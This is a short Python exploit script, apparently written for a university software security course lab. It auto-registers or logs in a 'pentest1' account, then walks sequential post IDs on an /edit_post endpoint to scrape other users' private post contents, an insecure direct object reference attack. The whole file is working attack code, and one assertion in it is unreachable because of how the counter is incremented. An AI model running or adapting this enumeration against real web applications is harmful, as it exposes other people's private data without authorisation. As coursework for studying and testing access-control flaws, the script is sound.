import requests, sys, re, time

params = { 
    'username': 'pentest1',
    'password': 'pentest1'
}
if len(sys.argv) == 2:
    url = sys.argv[1]
else:
    url = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt'


resource = '/login'


s = requests.Session()

path = url + resource
r = s.post(url=path, data=params)

if len(s.cookies) == 0:
    resource = '/register'
    path = url + resource
    r = s.post(url=path, data=params)
    resource = '/login'
    path = url + resource
    r = s.post(url=path, data=params)
    if len(s.cookies) == 0:
        print("Login && registration not successful! :(")
        print("Usage:\n\tpython3 vulnX.py [username] [password]\n")
        exit(2)

resource = '/edit_post'
path = url + resource
post_id = 1

while True:
    try:
        params = { 'id': post_id}
        r = s.get(url=path, params=params)
        secret = re.findall(r'>(.+?)</textarea>', r.text)[0]
        print(str(post_id) + " -> " + str(secret))
        post_id += 1
        time.sleep(1) # go nice and easy 
        if post_id == 1:
            assert 'No one will find that I have no secrets.' in secret
        if post_id > 5:
            print('...')
            break
    except Exception as e:
        break
